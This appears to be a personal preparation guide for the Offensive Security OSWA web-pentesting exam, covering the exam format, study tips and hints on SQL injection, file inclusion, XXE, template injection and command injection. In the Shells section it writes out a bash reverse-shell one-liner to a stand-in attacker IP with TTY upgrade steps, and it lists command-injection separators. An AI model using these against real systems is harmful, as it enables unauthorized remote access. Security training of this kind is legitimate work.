# OSWA Experience And Exam Preparation Guide
My Offensive Security OSWA certification experience and my personal opinion what helps in preparation for the exam 

## About OSWA/Web-200
### Content
The Offensive Security Web Assessor is the certification based on the web-200 course.
The goal of the web-200 course is to enable the participant to perform black box web application penetration tests.
Therefore, the course covers every relevant topic a pentest needs in these kind of penetration tests.
For a more detailed view regarding the content you can view the following resources:
- https://www.offensive-security.com/web200-oswa/
- https://www.offensive-security.com/documentation/WEB-200-Syllabus.pdf

### Exam
If you already took the OSCP certification of Offensive Security, the exam details probably sound very similar in your ears. The following points are some basic facts about the exam:
- 24 hours happy hacking
- 24 after the hacking part finished you need to have uploaded your pentest report
- 5 machines to pwn
- every machine has a local.txt and a proof.txt
- a total number of 100 points can be achived
- you need 70 points and a valid pentest report to pass the exam

If you want to know more details feel free to visit the official exam guide: https://help.offensive-security.com/hc/en-us/articles/4410105650964

## My Preparation and Experience
I would consider myself as a pentester with some decent level of experience. But I have to admit that the time frame in this certification probably makes it even for more experienced pentesters not like a walk in the park. So, for me the key to pass the exam were different points:
- go completely through the course material (even if you think you already know everything... there might be tips and tricks you did not know)
- clear all exercises 
- clear all challenge labs
- watch all videos (repition is the key to learn things)
- **make some write up of the course where write down commands in a copy/paste style, so you can recycle them during your exam (I did this several times)**
- if you have a subscription I would highly recommend doing the proving ground boxes provided by Offensive Security to gain speed in solving boxes
- speed, speed, speed... you need speed in clearing web application based CTF boxes to get fast enough to clear the exam boxes in the given time (basically you have about 3 to 3.5 hours per box if you at least want to have some sleep during the exam)
- parallelize tasks (e.g.: if you are performing some kind of dir busting, manually look at the target website and look for the juicy spots)
- be consequent: if you realize you are totally stuck, switch the target and come back later
- make screenshots from every of your exploitation steps in the moment you are successfully exploiting the target (you will need them during the reporting part)

## Syllabus Related Hints
In this section I will pick a few topics out of the syllabus and give some technical hints.
### Tools
#### Wordlists
Beside the standard Kali linux wordlists located under `/usr/share/wordlists` I think the seclists package is a premium set of wordlists which fits most needs. Especially it has lists connected to certain vulnerabilities like SQL-Injection, Local File Inclusion, Server-side Template Injection and so on which comes in handy for several topics of the web-200 course.
```bash
sudo apt-get install -y seclists
cd /usr/share/seclists/
```
#### Shells
During the course and the exam you will have to identify/exploit different kind of vulnerabilities which might lead to some kind of remote code execution. Therefore it is always useful to get reverse shell connecting to your kali machine instead of exploiting the vulnerability again and agin. For me in most cases the standard `bash` back connect shell worked great (under linux of course)
```bash
bash -c 'bash -i >& /dev/tcp/<KALI-IP>/9090 0>&1'
```
Sometimes it is useful to upgrade this shell to a fully interactive one
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
CTRL+Z
```bash
stty raw -echo; fg
```
Now you should have a fully interactive shell. This sometimes is needed when you do some kind of privilege escalation stuff. (not part of web-200)

### SQL-Injection
- `seclists` has awesome wordlists to manually detect SQL injection vulnerabilities using tools like `wfuzz` or `burpsuite`: `/usr/share/seclists/SQLi`
- one word regarding `SQLMap`: this tool is allowed during the exam
- however, in my experience `SQLMap` often fails even when there is an SQL-Injection
- I usually use `SQLMap` only after I identified the vulnerability manually and only use it to exfiltrate data when manual exfiltration is to expensive
- Therefore I parameterize `SQLMap` that it does not send useless requests to the target, because the tool is noisy as hell and (depending on the configuration) influences the integrity of the database
- When you identified an injection it is cruical that you have a good cheat sheet available, so you can exfiltrate data in a copy paste style
  - https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  - https://portswigger.net/web-security/sql-injection/cheat-sheet

### Directory Traversal and Local File Inclusion
- general test cases: https://zsahi.wordpress.com/2018/09/10/file-inclusion/
- useful wordlists to combine with `wfuzz` or `burpsuite`: `/usr/share/seclists/Fuzzing/LFI/`

### XML External Entity Attack
- Know how to idenfitiy this kind of vulnerability
- it is often overlooked in the real world
- every point where the application might parse XML is a potential dangerous sink where you can test for it
- get used to how to read files by exploiting an XXE attack "visibly" and blind
  - https://portswigger.net/web-security/xxe
  - https://portswigger.net/web-security/xxe/blind

### Server-side Template Injection
#### identify
- often overlooked
- identifying is not always easy 
- you need to identify what kind of technology/framework is used on the target machine
- then it is a good idea to perform some basic tests to identify if templates are used at all and the website is vulnerable
- `seclists` provides a good wordlist to detect SSTIs: `/usr/share/seclists/Fuzzing/template-engines-expressions.txt`
- The following picture gives an overview what template engine might be in use if certain tests succeed: https://portswigger.net/web-security/images/template-decision-tree.png

#### exploit
- the exploitation impact ranges from XSS to RCE depending on the template engine used
- RCEs for apache freemarker, twig and pug/jade: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

### Remote Code Execution
Try to think what the target application might do in the backend to look for reasonable sinks. When you identified a potential injection point you usually have to escape from the original command and inject your own.

#### Command Seperators
- `&`
- `&&`
- `|`
- `||`
- `;` (no Windows CMD)
- `0x0a` (no Windows CMD)
- `\n` (no Windows CMD)
- ``` `whoami` ``` (no Windows CMD)
- `$(whoami)` (no Windows CMD)

#### Good Reads
- https://www.hackedu.com/blog/owasp-top-10-mini-series-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection
